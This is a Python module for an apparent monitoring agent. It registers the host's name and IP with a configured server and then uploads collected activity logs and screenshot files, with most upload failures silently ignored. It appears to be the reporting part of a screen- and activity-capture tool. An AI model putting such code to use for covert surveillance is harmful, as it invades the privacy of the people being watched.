import requests
import json
from config import Config
from datetime import datetime

class Uploader:
    def __init__(self, storage):
        self.storage = storage
        self.base_url = Config.SERVER_URL

    def register_agent(self):
        try:
            url = f"{self.base_url}/agent/register"
            payload = {
                "hostname": Config.HOSTNAME,
                "ip_address": Config.IP_ADDRESS
            }
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200:
                print(f"Agent registered: {Config.HOSTNAME}")
                return True
            else:
                print(f"Registration failed: {response.text}")
                return False
        except Exception as e:
            print(f"Registration error: {e}")
            return False

        
    def upload_logs(self):
        logs = self.storage.get_pending_logs()
        if not logs:
            return
            
        payload = []
        log_ids = []
        
        for log in logs:
            # Convert timestamp to ISO format for server
            dt = datetime.fromtimestamp(log["timestamp"])
            payload.append({
                "log_type": log["log_type"],
                "content": log["content"],
                "timestamp": dt.isoformat()
            })
            log_ids.append(log["id"])
            
        try:
            url = f"{self.base_url}/agent/upload/logs?hostname={Config.HOSTNAME}"
            response = requests.post(url, json=payload, timeout=10)
            
            if response.status_code == 200:
                self.storage.mark_logs_sent(log_ids)
                # print(f"Uploaded {len(logs)} logs")
            else:
                pass
                # print(f"Failed to upload logs: {response.status_code} {response.text}")
        except Exception as e:
            pass
            # print(f"Upload error: {e}")

    def upload_screenshots(self):
        screenshots = self.storage.get_pending_screenshots()
        for shot in screenshots:
            try:
                url = f"{self.base_url}/agent/upload/screenshot"
                with open(shot["file_path"], "rb") as f:
                    files = {"file": f}
                    data = {"hostname": Config.HOSTNAME}
                    response = requests.post(url, files=files, data=data, timeout=20)
                    
                    if response.status_code == 200:
                        self.storage.mark_screenshot_sent(shot["id"])
                        # Optional: Delete file after upload to save space
                        # os.remove(shot["file_path"]) 
            except Exception as e:
                pass
                # print(f"Screenshot upload error: {e}")
